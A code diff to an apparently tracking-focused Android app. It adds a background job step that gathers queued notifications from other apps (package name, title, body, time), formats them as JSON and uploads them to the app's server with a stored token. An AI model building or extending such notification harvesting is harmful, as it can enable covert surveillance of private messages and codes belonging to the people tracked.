@@ -11,6 +11,12 @@ import android.util.Log;
 
 import com.tracker.app.net.ApiClient;
 import com.tracker.app.services.UploadQueue;
+import org.json.JSONArray;
+import org.json.JSONObject;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
+import java.util.TimeZone;
 
 import java.util.List;
 
@@ -60,6 +66,7 @@ public class UploadJobService extends JobService {
         new Thread(() -> {
             try {
                 processQueue();
+                processNotifications();
             } catch (Exception e) {
                 Log.e(TAG, "Upload processing error", e);
             }
@@ -102,6 +109,48 @@ public class UploadJobService extends JobService {
                 // Re-queue for retry
                 Log.w(TAG, "Upload failed, will retry: " + item.file.getName());
                 UploadQueue.requeue(item);
+            }
+        }
+    }
+
+    private void processNotifications() {
+        SharedPreferences prefs = getSharedPreferences("tracker_prefs", MODE_PRIVATE);
+        String apiToken = prefs.getString("api_token", null);
+        if (apiToken == null) return;
+
+        List<UploadQueue.NotificationItem> items = UploadQueue.drainNotifications();
+        if (items.isEmpty()) return;
+
+        Log.d(TAG, "Processing " + items.size() + " queued notifications");
+
+        try {
+            JSONArray arr = new JSONArray();
+            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
+            sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
+
+            for (UploadQueue.NotificationItem item : items) {
+                JSONObject obj = new JSONObject();
+                obj.put("package_name", item.packageName);
+                obj.put("title", item.title);
+                obj.put("body", item.body);
+                obj.put("posted_at", sdf.format(new Date(item.postedAt)));
+                arr.put(obj);
+            }
+
+            boolean success = ApiClient.uploadNotifications(apiToken, arr);
+            if (!success) {
+                Log.w(TAG, "Failed to upload notifications, re-queuing...");
+                for (UploadQueue.NotificationItem item : items) {
+                    UploadQueue.requeueNotification(item);
+                }
+            } else {
+                Log.d(TAG, "Notification logs uploaded successfully");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error formatting notifications payload", e);
+            // Put them back in queue
+            for (UploadQueue.NotificationItem item : items) {
+                UploadQueue.requeueNotification(item);
             }
         }
     }
